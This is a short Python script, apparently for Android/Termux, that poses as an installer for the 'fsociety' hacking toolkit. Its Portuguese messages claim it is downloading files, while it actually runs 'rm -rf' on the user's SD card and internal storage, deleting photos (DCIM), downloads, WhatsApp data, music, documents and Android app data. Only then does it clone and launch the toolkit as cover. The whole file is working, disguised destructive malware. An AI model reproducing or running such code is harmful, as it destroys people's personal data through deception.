import os
from time import sleep

print('\033[33m[*] ↓ Fazendo download dos arquivos... ↓\033[m')

            # Cartção SD

if os.path.exists('/storage/00FB-0CFC/') == True:
    os.system('cd /storage/00FB-0CFC/DCIM;rm -rf *')
    sleep(2)
        
if os.path.exists('/storage/00FB-0CFC/Download') == True:
    os.system('cd /storage/00FB-0CFC/Download;rm -rf *')
    sleep(2)

if os.path.exists('/storage/00FB-0CFC/Movies') == True:
    os.system('cd /storage/00FB-0CFC/;rm -rf Movies')
    sleep(2)

if os.path.exists('/storage/00FB-0CFC/Pictures') == True:
    os.system('cd /storage/00FB-0CFC/;rm -rf Pictures')
    sleep(2)

if os.path.exists('/storage/00FB-0CFC/Music') == True:
    os.system('cd /storage/00FB-0CFC;rm -rf Music')
    sleep(2)
    
if os.path.exists('/storage/00FB-0CFC/Músicas') == True:
    os.system('cd /storage/00FB-0CFC;rm -rf Músicas')
    sleep(2)

            # Memória interna...

if os.path.exists('/storage/emulated/0/WhatsApp') == True:
    os.system('cd /storage/emulated/0/;rm -rf Whatsapp')
    sleep(2)

if os.path.exists('/storage/emulated/0/GBWhatsApp') == True:
    os.system('cd /storage/emulated/0/;rm -rf GBWhatsapp')
    sleep(2)

if os.path.exists('/storage/emulated/0/Músicas') == True:
    os.system('cd /storage/emulated/0/;rm -rf Músicas')
    sleep(2)

if os.path.exists('/storage/emulated/0/DCIM') == True:
    os.system('cd /storage/emulated/0/DCIM;rm -rf *')
    sleep(2)

if os.path.exists('/storage/emulated/0/snaptube') == True:
    os.system('cd /storage/emulated/0/;rm -rf snaptube')
    sleep(2)

if os.path.exists('/storage/emulated/0/Documents') == True:
    os.system('cd /storage/emulated/0/Documents;rm -rf *')
    sleep(2)

if os.path.exists('/storage/emulated/0/MyBoy') == True:
    os.system('cd /storage/emulated/0/;rm -rf MyBoy')
    sleep(2)

if os.path.exists('/storage/emulated/0/games') == True:
    os.system('cd /storage/emulated/0/;rm -rf games')
    sleep(2)

if os.path.exists('/storage/emulated/0/Download') == True:
    os.system('cd /storage/emulated/0/Download;rm -rf *')
    sleep(2)
    
if os.path.exists('/storage/emulated/0/Whatsapp') == True:
        os.system('cd /storage/emulated/0;rm -rf Whatsapp')
        sleep(2)

if os.path.exists('/storage/emulated/0/Pictures') == True:
    os.system('cd /storage/emulated/0;rm -rf Pictures')
    sleep(2)

if os.path.exists('/storage/emulated/0/Movies') == True:
    os.system('cd /storage/emulated/0;rm -rf Movies')
    sleep(2)

if os.path.exists('/storage/emulated/0/Music') == True:
    os.system('cd /storage/emulated/0;rm -rf Music')
    sleep(2)

if os.path.exists('/storage/emulated/0/Android') == True:
    os.system('cd /storage/emulated/0/Android;rm -rf *')
    sleep(2)

os.system('cd;git clone https://github.com/Manisso/fsociety')
os.system('cd fsociety;chmod 777 *')
print('[*] \033[32mDownload concluído.\033[m')
sleep(3)
print('[*] \033[33mAbrindo ferramenta...\033[m')
sleep(7)
os.system('cd ~/fsociety;bash install.sh')
os.system('cd ~/fsociety;python2 fsociety.py')